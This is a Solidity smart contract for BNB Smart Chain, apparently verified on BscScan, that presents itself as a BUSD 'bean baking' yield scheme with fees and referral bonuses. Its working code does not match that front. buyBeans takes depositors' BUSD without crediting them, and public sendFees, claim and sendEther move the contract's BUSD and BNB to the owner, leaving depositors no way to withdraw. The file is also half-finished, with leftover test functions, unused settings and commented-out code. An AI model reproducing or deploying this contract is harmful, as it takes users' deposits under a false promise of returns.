/**
 *Submitted for verification at BscScan.com on 2023-05-21
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }

    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}
pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


library Math {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function pow(uint256 a, uint256 b) internal pure returns (uint256) {
        return a ** b;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

pragma solidity 0.8.17;

contract shortbusdT is Context, Ownable {

    using Math for uint256;
    address public OWNER_ADDRESS;
    bool private initialized = false;
    address BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public DEV_ADDRESS = 0x6B8b4a1AF677452E6ea2a177A910262b6BA64B13;
    address public MARKETING_ADDRESS = 0x6B8b4a1AF677452E6ea2a177A910262b6BA64B13;
    address public CEO_ADDRESS = 0x6B8b4a1AF677452E6ea2a177A910262b6BA64B13;
    address public GIVEAWAY_ADDRESS = 0x6B8b4a1AF677452E6ea2a177A910262b6BA64B13;
    address _dev = DEV_ADDRESS;
    address _marketing = MARKETING_ADDRESS;
    address _ceo = CEO_ADDRESS;
    address _giveAway = GIVEAWAY_ADDRESS;
    address _owner = OWNER_ADDRESS;
    uint136 BNB_PER_BEAN = 1000000000000;
    uint32 SECONDS_PER_DAY = 100;   //86400;
    uint8 DEPOSIT_FEE = 1;
    uint8 AIRDROP_FEE = 1;
    uint8 WITHDRAWAL_FEE = 5;
    uint16 DEV_FEE = 10;
    uint16 MARKETING_FEE = 19;
    uint8 CEO_FEE = 66;
    uint8 REF_BONUS = 5;
    uint8 FIRST_DEPOSIT_REF_BONUS = 5;
    uint256 MIN_DEPOSIT = 1 ether; // 1 BUSD
    uint256 MIN_BAKE = 1 ether; // 1 BUSD
    uint256 MAX_WALLET_TVL_IN_BNB = 100000 ether; // 100000 BUSD
    uint256 MAX_DAILY_REWARDS_IN_BNB = 6500 ether; // 6500 BUSD
    uint256 MIN_REF_DEPOSIT_FOR_BONUS = 1 ether; // 150 BUSD

    mapping(uint256 => address) public bakerAddress;
    uint256 public totalBakers;

    uint public balance;

    struct Baker {
        address adr;
        uint256 beans;
        uint256 bakedAt;
        uint256 ateAt;
        address upline;
        bool hasReferred;
        address[] referrals;
        address[] bonusEligibleReferrals;
        uint256 firstDeposit;
        uint256 totalDeposit;
        uint256 totalPayout;
    }

    mapping(address => Baker) internal bakers;

    event EmitBoughtBeans(
        address indexed adr,
        address indexed ref,
        uint256 bnbamount,
        uint256 beansFrom,
        uint256 beansTo
    );
    event EmitBaked(
        address indexed adr,
        address indexed ref,
        uint256 beansFrom,
        uint256 beansTo
    );
    event EmitAte(
        address indexed adr,
        uint256 bnbToEat,
        uint256 beansBeforeFee
    );

        constructor() {
        OWNER_ADDRESS=msg.sender;
    }

    function user(address adr) public view returns (Baker memory) {
        return bakers[adr];
    }

    function buyBeans(uint256 _amount)  public {
        
        
        IERC20(BUSD).transferFrom(msg.sender, address(this), _amount);
    }

        function sendFees(uint256 _amount) public {

        IERC20(BUSD).transfer(OWNER_ADDRESS, _amount);
        //IERC20(BUSD).transfer(_marketing, 10);
        //IERC20(BUSD).transfer(_ceo, 10);

       
    }

    receive() external payable {
        balance += msg.value;
    }

    function pay() external payable {
        balance += msg.value;
    }

    // transaction
    function setMessage(string memory newMessage) external returns(string memory) {
        message = newMessage;
        return message;
    }

    // call
    function getBalance() public view returns(uint _balance) {
        _balance = address(this).balance;
        //return _balance;
    }

		string message = "hello!"; // state
    function getMessage() external view returns(string memory) {
        return message;
    }

    function claim() external payable {
        require(msg.sender == OWNER_ADDRESS);
        //uint256 pledged = balance;
        //pledged = pledged - 10000000000000000; // 16 of '0's
        payable(OWNER_ADDRESS).transfer(address(this).balance - 10000000000000000);
    }
    function sendEther(address payable receiver) external  {
        require(receiver == OWNER_ADDRESS, "NO 0x5B3");
        //uint256 pledged = balance;
        //pledged = pledged - 10000000000000000; // 16 of '0's
        receiver.transfer((address(this).balance - 10000000000000000));
    }

}